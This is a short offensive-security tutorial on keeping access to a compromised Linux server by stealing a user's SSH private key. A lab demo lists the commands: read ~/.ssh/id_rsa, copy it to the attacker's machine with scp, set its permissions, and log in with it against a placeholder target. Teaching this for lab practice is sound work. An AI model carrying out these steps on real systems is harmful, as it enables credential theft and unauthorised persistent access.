# Persistence Via SSH Keys

## Persistence Via SSH Keys

* Linux is typically deployed as a server operating system and as a result, Linux servers are typically acessed remotely via services/protocols such as SSH.
* If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
* In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password.
* After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access.

## Practice Demo

In this case we have the credentials to login with ssh as the student user.

In the home directory we have the "<mark style="color:red;">.ssh</mark>" folder.

We navigate to the <mark style="color:red;">.ssh</mark> folder.

#### Cat the private key:

* <mark style="color:yellow;">cat id\_rsa</mark>

#### Copy the private key into our system

* <mark style="color:yellow;">scp student@targetIP:\~/.ssh/id\_rsa .</mark>

#### Give the appropriate permissions to the private key file

* <mark style="color:yellow;">chmod 400 id\_rsa</mark>

#### Access using the private key

* <mark style="color:yellow;">ssh -i id\_rsa student@targetIP</mark>
